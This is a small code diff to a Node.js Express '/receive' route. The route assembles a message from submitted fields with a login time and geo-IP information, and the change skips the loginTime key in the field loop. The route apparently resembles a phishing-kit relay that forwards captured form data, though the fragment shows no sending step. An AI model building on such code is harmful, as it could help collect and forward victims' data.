@@ -104,8 +104,11 @@ app.post('/receive', async (req, res) => {
                `👤 ${myObject['loginTime']}\n\n`;
 
     for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
+	    if (key !== 'loginTime') {
+    console.log(`${key}: ${myObject[key]}`);
+      message += `${key}: ${myObject[key]}\n`;;
+	    }
+      
     }
     
     message += `🌍 GEO-IP INFO\n` +
